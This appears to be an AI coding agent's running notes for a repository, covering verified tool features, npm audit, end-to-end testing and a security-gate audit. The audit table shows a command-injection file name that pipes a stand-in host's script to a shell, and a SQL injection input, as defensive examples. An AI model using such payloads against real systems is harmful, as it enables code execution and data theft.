  installed in the tree.
- **Use it when:** writing against any fast-moving library (Next.js, Expo/RN, Tailwind, Clerk, Stripe,
  Framer Motion, GSAP), or when an API you "remember" fails. Pairs with the never-ship-a-hallucinated-API
  principle — Context7 is how you check rather than guess.
- Activates on the next session start (MCP servers load at startup).

## Claude Code / Claude API capabilities — verified 2026-07 (do not work from reel claims)
Checked against the docs after a reel asserted a "new Ultron model, Mythos" that **does not exist**
(real families: Opus, Sonnet, Haiku, Fable). Verify before a plan depends on a capability.
- **`/rewind` — REAL.** Rolls back to an earlier point in the session using automatic per-turn
  checkpoints; restores conversation state *and* file changes. **Limits that matter:** changes made by
  bash commands and by **subagents are NOT restored** — so it is not a safety net for delegated build
  work. Commit-often remains the real undo. Docs: code.claude.com/docs/en/checkpointing.
  The "Esc-Esc" shortcut for it is **UNCONFIRMED** — not in the docs.
- **`/effort` — REAL.** Sets reasoning effort (`low` / `medium` / `high`, plus an `ultrathink` option).
  Directly relevant to credit: drop effort for mechanical work, raise it for architecture. Per-model
  support is not fully documented — check `claude help /effort`.
- **`/teleport` and `/remote-control` — REAL**, but conditional on cloud-environment setup
  (web platform / subscription / org enablement). `/teleport` moves a session between terminal and web.
  **MEASURED 2026-08-16, and the earlier reading of it was wrong in a way that wasted three turns.**
  Remote Control **exposes ONE terminal session on claude.ai so a phone or browser can drive it. It
  does not bridge two sessions.** Running it on the owner's PC returned
  `/remote-control is active · Continue here, on your phone, or at claude.ai/code/session_<PC-id>` —
  that worked. Running it in this cloud session returned *"this session is already running in Claude
  Code on the web"* — also correct, and not a failure.
  **Consequence: a cloud session cannot reach the owner's machine, and `ListAgents` returning "No
  reachable agents" here is the expected answer, not a broken connection.** Stop diagnosing it. Two
  sessions on one account are two sessions; the handoff between them is **git**, same as between any
  two machines. Machine-local work (a real browser with the owner's profile, a global npm install,
  anything touching Windows) belongs in the PC session; repo work belongs here.
- **`/tasks` — REAL** for todo/task tracking across sessions. The separate notion of "background tasks"
  is **UNCONFIRMED** as a documented feature name; `claude agent view` and `claude list-sessions` are
  what the docs give for background sessions.
- **Managed Agents (Claude API) — REAL and GA.** Anthropic-hosted stateful agents in a managed sandbox:
  tool integration, session state + memory stores, multi-agent orchestration, credential vaults,
  permission policies. Endpoints `/v1/beta/agents`, `/v1/beta/sessions`, `/v1/beta/deployments`,
  `/v1/beta/vaults`; auth via the standard `ANTHROPIC_API_KEY` bearer token. Pricing not stated in
  docs — check the Console before designing around cost. **Why it matters to Execute:** it is the
  supported way to run agents server-side without this ephemeral container, and the obvious host if a
  project ever needs agents running on a schedule rather than in a session.

## npm audit — counting inheritance turns 2 problems into 22, and "npm audit fix --force" is often a DOWNGRADE. 2026-08-18

Two projects were blocked from pushing by the gate's `npm audit` check. Both are now unblocked, and
the two lessons generalise well beyond them.

**1. `npm audit` counts INHERITANCE, and the headline number is mostly not real.** `projects/example-app`
reported 27 high. Filtering to entries with an actual title and GHSA url — a root finding, rather than
a package flagged only because something beneath it is — left **two**, both in `image-size`. The other
twenty (`react-native`, `expo`, the whole `metro` chain, `react-native-screens`, four
`@solana-mobile/*`, `@clerk/clerk-expo`) carried `via: <other package>` and no advisory of their own.
**Always resolve to roots before reacting to a count.** `security-gate` now does this automatically and
reports the roots.

**2. `npm audit fix --force` frequently proposes a DOWNGRADE, and npm does not say so.** For an example app it
offered `react-native@0.72.17` and `expo@53.0.27` against a declared stack of **RN 0.85.3 / Expo
~56.0.11 / React 19.2.3** — thirteen minors and three SDK majors backwards, plus `@clerk/clerk-expo`
from ^2.19.31 to 1.2.9. It works only because an old enough bundler predates the vulnerable dependency.
It does not patch anything. **Never run `--force` to find out what it does — `--dry-run` it and read
the plan.**

**The mirror-image trap, on `an example marketing site`:** the same `--force` recommendation there was an *upgrade*,
`next 16.2.9 → 16.3.1`, a patch bump that only needed `--force` because package.json pinned the version
exactly. Six highs went to zero. **So "--force" means neither safe nor dangerous — it means "outside
your stated range", and only the dry run tells you which.** Bump the pin yourself once you have read it.

**3. Some advisories have no fix, and the answer is a dated per-advisory exception, never a lowered
threshold.** `image-size@2.0.2` is the LATEST published version and the advisory covers `<=2.0.2` —
verified against the registry, nothing above it under any tag. It reaches the app only through metro at
**build time** and is not in the shipped bundle. Dropping the gate's `--audit-level` would have passed
the push and silently stopped catching everything else too. Instead `security-exceptions.json` names
each GHSA id with a reason and a review date; anything unnamed still fails, and an **expired entry fails
louder than the advisory did**, because a forgotten exception is worse than an open finding.

**Proven in four directions on the real project** (not a fixture — it needs a real audit result): both
accepted → pass · remove one → FAIL · expire them → FAIL as `security-exception-expired` · delete the
file → FAIL with 2 unaccepted roots.

**4. A dependency-bump build failure is guilty until proven innocent — but check.** `an example marketing site` failed
to build straight after the Next upgrade, on `CLERK_SECRET_KEY is set but
NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY is not`. That is the project's **own env guard**, not the upgrade;
building on the keyless path it names succeeds, eight routes prerendered. One extra command separated
"the upgrade broke it" from "the container lacks a key".

## Claude Routines — checked 2026-08-18, after a reel. REAL, and Execute mostly already had it.

Reel `DcNFvJQOrF3`: *"Claude routines allow you to schedule automations with Claude that run even when
your computer is asleep… they run on Anthropic's servers and aren't dependent on your computer at
all."* Examples given: research on the internet, analyse your inbox, analyse competitors' ads.

**Real, and seen rather than taken on faith.** A frame shows Claude Desktop's **Routines** panel:
*"Create templated routines that can be kicked off on schedule, by API, or webhook"*, a list of five
routines each on a schedule (*"Every day at 9:00 AM · Next run tomorrow at 9:00 AM"*), and each
carrying a **`☁ Cloud`** badge — which is the claim's actual substance.

**Do NOT confuse it with the `CronCreate` tool available in a Claude Code session.** Read its own
description: *"Jobs live only in this Claude session — nothing is written to disk, and the job is gone
when Claude exits"*, `durable` **has no effect**, and recurring jobs **auto-expire after 7 days**. That
is an in-memory scheduler for one session, not a cloud routine. Two different things with similar
names, and assuming they were the same would have produced an automation that silently stopped.

**NOT adopted, because the pitch is already satisfied here — by GitHub Actions.** Checked rather than
assumed: `.github/workflows/an example agent project-discover.yml` runs **daily at 06:30 UTC**, and `origin/main`
carries `an example agent project <actions@github.com>` commits on the 17th and 18th proving it is live.
`watchdog.yml` runs daily at 07:00. Deterministic fetch/build/gate work belongs there anyway — it is
free, versioned, produces a commit, and the diff is the evidence.

**Where Routines WOULD add something we cannot do today:** reasoning over the owner's own accounts on a
schedule — an inbox, a calendar, a Drive — through Claude's connectors. GitHub Actions runs scripts; it
cannot read an inbox and form a judgement. If a job of that shape ever appears, this is the tool.

### The finding that actually mattered — the reel earned its keep by exposing a gap, not by selling one

Checking "do we already have scheduled automation?" turned up something worse than a missing feature:
**`applications.json` has carried `follow_up_due` since the tracker was written, and nothing ever read
it on a schedule.** The daily workflow ran discover → tailor → pdf → dashboard and **never the
tracker**. So the single field in the whole project with a DATE on it was the one field nobody watched.
BlackRock's follow-up (due 2026-08-28, on a rolling-review programme where chasing matters) would have
passed in silence.

Fixed: a `Follow-ups due today` step runs `track list --due`, and **a due follow-up opens a GitHub
issue** rather than only printing to the step summary — nobody opens a green run, so a summary line is
the same as nothing. Proven both directions before shipping: with the real dates it reports *"nothing
needs chasing today"* and opens nothing; with the follow-up forced to today it prints
`BlackRock … ← CHASE` and would open the issue.

**The general lesson, and it is not about Claude:** *"do we already have this?"* is a better first
question than *"should we adopt this?"* — and the answer to the first one is where the bugs are. Two
reels in a row have now been most useful for what they made me go and check.

## Human-simulating end-to-end testing — a reel with no tool in it, and it found a real bug. 2026-08-19

Reel `Dbrf98cjud6`: *"Your coding agents should be doing human simulating end-to-end app testing.
Having your agents run unit or integration tests on the code that they've written for your app does
not test your app."* Three steps: (1) what **surface** will a human use — web, iPhone, desktop, and
there are tools for each (Playwright CLI, native computer use, Xcode MCP); (2) what is the **branching
tree of user flows** on that surface; (3) walk the branches.

Its sharpest line is the one worth keeping: **"unit tests are written to overfit and pass those tests
— probably by whoever wrote the bug."** And the analogy lands: putting a car on a treadmill and
repeating the same three steering movements is not the same as letting someone drive it.

**Nothing to adopt — Execute already had the concept.** `runtime-eval.sh` says it in its own header
(*"run the thing the way a person will, not the way its tests do"*) and the push gate already warns
when a project has no declared journey. **But asking which projects had one was the whole payoff:**

> Four projects had a journey — `an example agent project`, `an example memory engine`, `an example watcher project`, `an example build graph` — and
> **every one is a CLI tool.** Every project with an actual interface was reported NOT CHECKED.

That is not chance. A script journey is easy; a browser journey is work. So the projects a **human**
touches were exactly the ones nothing walked. **Look for that shape elsewhere: where a check is
optional, it gets skipped precisely where it is hardest and therefore most valuable.**

`visual-qa` did not cover it either, and this was measured: **`sweep.mjs` contains zero `.click(`
calls.** It tests **pages**. The bug was in the **edges between pages**.

**The bug it found on an example marketing site, first walk:** `/privacy`, `/terms`, `/support` and `/delete-account`
all built, all rendered perfectly, and **not one linked from anywhere on the site.** Every unit test
green, every page screenshot green, and a visitor could only reach the privacy policy by guessing the
URL. Self-serve delete is a ship-blocker in CLAUDE.md, and a page nobody can find does not discharge
it. Fixed with a footer legal nav, and the journey is now wired into the gate as `journey_an example app_web`.

**Two of the first walk's four failures were the TEST's fault, and that is the part to remember.**
`/app` was called "an empty body" because the test used `waitUntil: "load"` on a client-rendered
route; it renders a login screen a moment later. And a console 404 was reported that **the test itself
caused**, by deliberately visiting a made-up URL to check the not-found page. A gate that cries wolf
gets ignored, which is the same evaluator-decay failure as the flaky visual baseline the day before —
so **when a new check fires, verify each finding independently before believing your own tool.** Half
of these were mine.

**And the fix itself failed the next gate**, which is the system working: the new footer links shipped
at `text-forest-700/70`, and axe measured **3.47:1 against 4.5:1 required**, serious, on all three
widths. A legal link nobody can read is barely better than one nobody can reach. Corrected to `/85`,
the token the row above already used and already passed with.

## `/model opusplan` — checked 2026-08-19, after a reel. REAL, current, and it is Execute's rule 2 in one word.

Reel `DZC33dKIrAj` (Spanish/Portuguese, "César"): shows `/model` in Claude Code, then types
**`/model opusplan`**, revealing a fourth option the picker does not list until you set it —
*"Opus Plan Mode · Use Opus in plan mode, Sonnet 4.5 otherwise."*

**The reel is dated** — its frames show Claude Code **v2.1.23** and **Opus 4.5**, with an "Update
available" banner on screen. So the demo is old. **But the feature is current**, verified against the
official docs rather than the video (`code.claude.com/docs/en/model-config`):

> **`opusplan`** — *"Special mode that uses `opus` during plan mode, then switches to `sonnet` for
> execution."*

**Why this matters here more than any other reel this month: it is CLAUDE.md rule 2, built into the
CLI.** Rule 2 says planning runs on Fable and *"Fable plans; it does not hand-build"*, with building
delegated to Sonnet/Opus agents. Execute already enforces that for **subagents** via `model:`
frontmatter. It does **not** enforce it for the **main thread** — that half is prose, and prose is what
quietly stops happening.

**And the plan phase can be pointed at Fable, which the reel never mentions.** From the same docs:

> `ANTHROPIC_DEFAULT_OPUS_MODEL` — *"The model to use for `opus`, **or for `opusplan` when Plan Mode is
> active**."*
> `ANTHROPIC_DEFAULT_SONNET_MODEL` — *"…or for `opusplan` when Plan Mode is **not** active."*

So `opusplan` + `ANTHROPIC_DEFAULT_OPUS_MODEL=claude-fable-5` gives **Fable plans, Sonnet builds**,
automatically, tied to plan mode. There is **no `fableplan` alias** — this env-var route is how you get
there. (`opusplan[1m]` forces the 1M window on both phases; the plan phase otherwise inherits whatever
`opus` gets.)

**THE LANDMINE, and it is worth more than the tip: `CLAUDE_CODE_SUBAGENT_MODEL`.** The docs are
explicit that it *"overrides the per-invocation `model` parameter **and the subagent definition's
`model` frontmatter**"*. Setting it — for cost, say — would **silently flatten Execute's entire
three-tier scheme to one model**, with no error and no warning. Every `model: fable` planner and every
`model: sonnet` builder would just... stop being that. Set it to `inherit` if it is ever touched.

**NOT applied to the owner's setup, deliberately.** `.claude/settings.json` here sets no `model` key,
and switching which model their sessions run on changes both behaviour and cost — that is their call,
like the visual-qa motion decision. Rule 2 in CLAUDE.md now *names* the mechanism so the option is
visible; turning it on is one settings key and one env var.

**Third instance of the same pattern this week, and that is the real finding.** `bar_to_beat` was
recorded in the profile and read by nothing. `follow_up_due` was tracked and checked by nothing. Rule
2's main-thread tier is written in CLAUDE.md and enforced by nothing. **When a rule exists as prose,
go looking for the mechanism that would make it true — that gap is where this repo's bugs live.**

## "Your multi-agent system is probably a queue, not a team" — both sources verified, and Execute already found half of it the hard way. 2026-08-27

Reel `Dci1jKGIddd` (Romi Patel, same creator as the memory-layers one). Claim: multi-agent is
routinely chosen for problems one agent with more tools would solve, and the cost is measurable.

**Every checkable number was checked against the primary source, not the reel.**

| claim | verdict |
|---|---|
| Anthropic: agents ≈ **4×** the tokens of chat, multi-agent ≈ **15×** | **Verified verbatim** — anthropic.com/engineering/multi-agent-research-system: *"agents typically use about 4× more tokens than chat interactions, and multi-agent systems use about 15× more tokens than chats."* |
| Anthropic: worth it for parallelisable work, info beyond one context window, many complex tools | **Verified** — *"heavy parallelization, information that exceeds single context windows, and interfacing with numerous complex tools"*, gated on *"the value of the task is high enough."* |
| Anthropic re-architected so subagents write to a store and pass a **reference** | **Verified** — the appendix recommends subagents *"store their work in external systems, then pass lightweight references back to the coordinator"*, which *"reduces token overhead from copying large outputs through conversation history."* |
| Microsoft: redundant context per agent, latency stacking at handoffs | **Verified** — Azure CAF *Single agent or multiple agents*: *"each agent processes redundant context"*, *"Latency accumulates at each handoff point."* |
| Microsoft's non-performance case | **Verified but UNDER-COUNTED by the reel.** Microsoft names **three** start-multi-agent criteria: (1) crossing security/compliance boundaries, (2) multiple teams owning separate domains, **(3) future growth planned** — modular design when the roadmap spans 3–5+ distinct functions. The reel folded 1+2 together and dropped 3. |

**Now the part that matters — Execute is a multi-agent system, so the four-case test applies to it.**

- **Parallel subtasks** — partly. The plan-into-tickets structure supports it; plenty of real builds still run sequentially, so this earns less than it looks.
- **Information beyond one context window** — yes, straightforwardly. This repo is large and `an example memory engine` exists precisely because a grep over the whole tree was the alternative.
- **Tool list too big for one agent** — yes. The MCP surface plus ~40 skills is past what one agent should be choosing from.
- **The non-performance case** — **this is Execute's strongest justification and it is not about compliance.** `agent-graph-engineering.md` rule 1 forbids an evaluator from ever seeing the builder's transcript: `qa`/`product`/`security-reviewer` get the spec and the artifact in fresh context. That is **separation of duties applied to correctness** rather than to regulation, and it is structurally identical to Microsoft's own example — *"one agent to prepare transactions while another validates them, enforcing separation of duties through architecture."* A single agent with more tools **cannot** produce this property, because the blind spot travels with the context. So the isolation is the thing being bought, and the token cost is the price of it.

**Anthropic's shared-store fix is already Execute's rule 2, arrived at independently.** *"Handoffs are artifacts (commits, files, PROJECT-LOG entries, gate stamps), not conversations"* — with **git as the external store and a commit as the lightweight reference**. Nothing large is copied through the orchestrator's context.

**And the redundant-context finding was learned HERE first, from a failure, before this reel described it.**
`memory/principles.md:110`: *"Under tight token budgets, prefer fewer, bigger delegations — or build
directly… Each delegation re-pays the context cost of the whole project."* That was written after two
subagents (pm, developer) died on session limits mid-build and the orchestrator finished faster by
building in-context. Same mechanism Anthropic measured, discovered by being burned by it.

**The gap, stated honestly — and it may not be fillable.** Nothing in this repo **measures** whether a
given delegation earned its cost. Grepped: the only token-cost material is that one principle and one
tool-note aside; there is no per-delegation accounting anywhere. That is the recurring shape (*a rule
that exists as prose and is enforced by nothing*) — **but** unlike the previous instances, the
mechanism to fix it may not exist: a session cannot reliably read its own subagent token spend from
the inside. **So this is logged as a gap with no known fix, not as a to-do.** If per-agent usage ever
becomes readable, the check to build is "did this ticket need its own context, or was it a queue entry
wearing a team badge?"

**The one line worth carrying into every orchestration decision:** *everything else collapses into one
agent with more tools.* Execute's existing brake — *"grow the graph only when a distinct metric is
being neglected; start with one loop"* — says the same thing, and now has a measured price tag
attached to ignoring it.

## Every detection now has a protection — the full audit. 2026-08-27

**Owner:** *"for everything u have detected and not protected implement protection now."*

The right instruction, and the audit was worse than expected. Enumerated every rule in
both scanners: **14 in `security-gate`, 9 in `system-design-gate`.** Exactly **three** had
a protection to point at (the `not-get-sued-101` trio, written an hour earlier). Every
other rule could report an absence and offer nothing.

**Why that gap is worse than it sounds:** whoever hits the finding writes their own fix,
under deadline, without the context that produced the rule. The gate then passes and the
implementation is whatever that person guessed.

**`.claude/skills/gate-protections/`** — seven modules, **43 assertions, every one proven
in both directions** (accepts the legitimate case AND refuses the attack), wired into
`runtime-eval.sh skills` so they are executed rather than merely written.

| rule | protection | the attack it stops |
|---|---|---|
| `shell-interpolation` | `shell.mjs` — `execFile` + an argument array, never a command string | `a.png; curl evil.sh \| sh` |
| `sql-interpolation` | `sql.mjs` — tagged template returning `{text, values}` | `1 OR 1=1` returns every row |
| `no-rate-limit-reference` | `rate-limit.mjs` — token bucket, per-key **and global** | cost-exhaustion, an unbounded bill |
| `token-in-localstorage` | `tokens.mjs` — httpOnly cookie, or in-memory with no persist method | one XSS takes the session |
| `fetch-no-timeout` | `http.mjs` — owned AbortController, backoff, retry only 5xx/429 | a hung upstream holds your connections |
| `tls-verify-disabled` / `insecure-http` | `http.mjs` — trust the CA, never disable verification | HTTPS minus verification is HTTP |
| `eval-usage` | `safe-eval.mjs` — JSON.parse, allow-listed dispatch, an arithmetic parser with **no identifiers in its grammar** | their string, your privileges |
| the 7 secret rules | `secrets.mjs` — env schema, non-enumerable secrets, generated `.env.example`, `redact()` | a key in a file is a key in the history |

**Two carry a scar this repo already paid for.** The rate limiter refuses a forwarded
header as a key by default and refuses unkeyed traffic outright, because
`memory/principles.md` records an AI route keyed on a spoofable `x-user-key` — change the
header, get a fresh budget. And it has a **global** ceiling, because per-key limits bound
one abuser while only a global ceiling bounds the bill. The TLS guidance points at
`NODE_EXTRA_CA_CERTS` — the real need behind `rejectUnauthorized: false` is almost always
a proxy with its own CA, which is *this container*, and the answer is to trust that CA.

**The bug the tests found, and it is the useful one.** `fetchSafe` first used
`AbortSignal.timeout(ms)`. **Measured: that timer is UNREF'd** — when the pending request
is the only thing on the event loop, the process exits and the abort never fires, so the
request neither completes nor times out. Rewritten with an owned `AbortController` +
`setTimeout` cleared in `finally`, which also stops leaking a pending timer per successful
call.

**A timeout never observed to fire is not a timeout.** It was only caught because the
assertion demanded the abort *happen*, rather than checking that the option was passed —
which is the difference between testing behaviour and testing configuration.

**The rule to carry forward: a gate rule that can only report an absence must ship with
the presence.** Otherwise the gate is a list of problems nobody is equipped to solve.

**Postscript — third time a reference tripped the gate on its own explanatory text.**
This push was blocked on: a comment in `http.mjs` that quoted the exact TLS-disabling
literal *while teaching people not to write it*, and a secret-shaped `API_KEY` fixture in
the self-test. Fixed the same way as the two before it — compose fixtures at runtime, and
refer to the **rule id** in prose rather than reproducing the dangerous literal. That is
better documentation anyway; the reader can look the rule up.

**The tempting generalisation is wrong.** "Make the gate ignore comments" would clear all
three at once and is exactly the weaken-the-gate move: a secret in a comment is still a
secret in the repository. The friction is the gate working. Three occurrences in one day
is a pattern in how reference code gets written, not evidence the rule is too strict.

### CORRECTION 2026-08-28 — reason 2 above was wrong, and the tool is now IN the library

**Owner:** *"only applies to linkedin … my professional life recreational life and side hustle life
have diff standards"* — and they pointed at `ideas/an-example-side-hustle-idea.md`, an
agency-shaped commercial idea, as exactly the place this would be useful.

**What I got wrong.** The owner declined a LinkedIn page on authenticity grounds. I generalised a
**professional-domain** ethic into a universal one and used it to rule the tool out of the
**side-hustle** domain entirely. Domains do not share standards, and *"the owner wouldn't do that"*
is only ever true of a domain, never of the owner. Recorded as a standing rule in
`memory/user-profile.md` → **Three domains, three standards**.

**Which of the three reasons survive:**

1. **Taste — SURVIVES, scoped.** `owner-design-taste` governs what the owner ships **under their own
   name**. Batch stock footage with TTS over it is the slop that law exists to prevent, so this stays
   away from the portfolio site, the CV and `an example agent project`. It says nothing about a commercial channel.
2. **Ethics — WITHDRAWN.** It was a professional-domain rule misapplied. In the side-hustle domain,
   volume tactics are on the table subject to law and platform policy.
3. **No job on the board — STILL TRUE, but the board changed.**
   `ideas/an-example-side-hustle-idea.md` is a real side-hustle idea and a content channel is a
   plausible part of it. Not a need *today*; a foreseeable one.

**Action taken: ADDED to `execute.md` §4 Video Generation, scoped to the side hustle**, alongside
HyperFrames with the split stated — HyperFrames renders *the video you designed*; MPT invents *a
video from a keyword*. **Not installed, no account, no auto-publish configured.** Listing a tool is
not deploying one, and the credit-management rule applies: an API key means a bill.

**The meta-lesson, and it is the one worth keeping.** This is exactly the gap logged on 2026-08-27
from the memory-layers reel: *the episodic layer records what Execute did, never the moments the
owner corrected it.* Here is a live instance — a correction that changes future decisions, which
would have survived only as prose in a profile if it had not been written down deliberately. **The
case for building correction-capture just got its first concrete example.**

## Chromium cannot reach the public internet from this container — curl can. 2026-08-28

**Measured, because it changes what "go and look at the site" means here.** Playwright's bundled
Chromium fails every external navigation with `net::ERR_CONNECTION_RESET`, including
`https://example.com/`, under all four configurations tried:

| attempt | result |
|---|---|
| default launch (Chromium reads the system proxy) | `ERR_CONNECTION_RESET` |
| `proxy: { server: process.env.HTTPS_PROXY }` | `ERR_CONNECTION_RESET` |
| `--proxy-server=$HTTPS_PROXY` as a launch arg | `ERR_CONNECTION_RESET` |
| `--proxy-server` plus `--disable-quic` | `ERR_CONNECTION_RESET` |

`curl https://unitedcarriers.com/` returns **HTTP 200** in 0.53s over the same proxy, so egress
itself is fine and the CA is trusted. The proxy's `__agentproxy/status` shows Chromium's own
telemetry (`clients2.google.com`) arriving as `non-CONNECT request`, so the browser reaches the
proxy and its HTTPS tunnelling is what does not survive. **It is not the site, not the CA, and not
a missing proxy flag** — all three were eliminated before concluding.

**CORRECTED THE SAME DAY — external sites ARE reachable, and the block is only the transport.**
The paragraph that used to sit here said reference sites could not be visited. That was a true
observation ("Chromium's HTTPS is blocked") promoted into a false law ("so we cannot browse"), which
is the exact mistake this file already warns about under Instagram.

Node's `fetch` reaches those sites fine, and **Playwright's `route` handler runs in Node, not in the
page.** So every request the browser makes can be intercepted, performed by Node, and fulfilled back
into the browser. The page is entirely real — the server's own HTML, CSS, JS, fonts and images —
and only its transport is borrowed.

Packaged as `.claude/skills/browser-drive/external-site.mjs`:
```bash
node .claude/skills/browser-drive/external-site.mjs https://example.com/ /tmp/out --seconds 50
```
**Proven 2026-08-28 on unitedcarriers.com: 404 requests served, 0 failed**, a 28,229px page rendered
with its scroll-driven scenes running, recorded to a 50-second video plus screenshots.

Three details that make it work, all of which fail silently if skipped: request
`accept-encoding: identity` and strip `content-encoding`/`content-length` from the response, because
`fetch` has already decoded the body; strip `content-security-policy`, because a CSP written for the
real origin refuses the subresources being fulfilled; and `route.abort()` inside a try/catch, because
the page may already be gone when a late request fails.

**So the honest rule now:** localhost work (`visual-qa`, `journey.mjs`) needs nothing special, and
external sites need this script. Rendering, screenshots, video and scroll behaviour are all
available. What is still unavailable is a plain `page.goto` to an external URL — reach for the
script rather than concluding it cannot be done.

**The fallback that does work, in order:** `curl` the HTML and read what it actually ships — script
tags name the stack, `<video>` tags and their `content-length` give the real weight, the stylesheet's
`content-length` gives the real payload. That produced genuine findings on unitedcarriers.com (a
Webflow site with a 52 KB custom bundle and a 438 KB stylesheet) which no amount of describing the
reel would have. For anything that needs rendering — screenshots, Core Web Vitals, reduced-motion
behaviour — it is the owner's own machine via `/remote-control`, the same answer as Instagram
cookies.

## Anthropic's AI-Native SDLC playbook — real, and the reel that carried it was slightly wrong. 2026-08-28

Reel `DcllA-5oW0w` (Romi Patel, same creator as the memory-taxonomy one) summarising
**"The AI-Native SDLC playbook"** from Anthropic's Applied AI team. Checked against the primary
source at `claude.com/blog/the-ai-native-sdlc-playbook` rather than the video.

**Real, and the core claim holds:** *code is no longer the bottleneck*, so the constraint moved to
planning, review and deployment. Every stage commits an artifact; each handoff is a git commit; the
chain doubles as the audit trail.

**Where the reel is wrong, and it matters:**
- It shows **five** stages (Plan / Build / Review / Deploy / Operate). The playbook has **six** —
  Plan / Design / Build / Test / Deploy / Maintain. **Design and Test are precisely the stages a
  team drops under pressure**, so losing them from the diagram loses the point of the diagram.
- It draws a straight line ending in production. The playbook's **Maintain stage emits a new
  intent**, which is what makes it a loop rather than a pipeline.

**Where the reel understates it:** its guardrail split is correct — skills advisory, hooks
deterministic — but hooks have **three** outcomes (allow, ask, block), not two.

**Where the reel is exactly right:** *"The agent that wrote the code has no way to approve it."*
Separation of duties via branch protection and a human code owner. That is already how this repo
works — Execute pushes to a branch and the owner merges — but it had never been written down as a
rule, only practised by habit.

**Built as `.claude/skills/sdlc-chain/`.** Execute already had most of these artifacts scattered
across `potential-projects/` and `projects/` and **zero enforcement** — a project could be built
with no spec and no plan and nothing would notice. Measured on the real repo: **10 of 10 projects
lack a committed intent, spec or plan**; `an example marketing site` is closest, missing only the design artifact.
Grandfathered rather than retro-enforced, because a gate that fails every push tomorrow is a gate
switched off the day after.

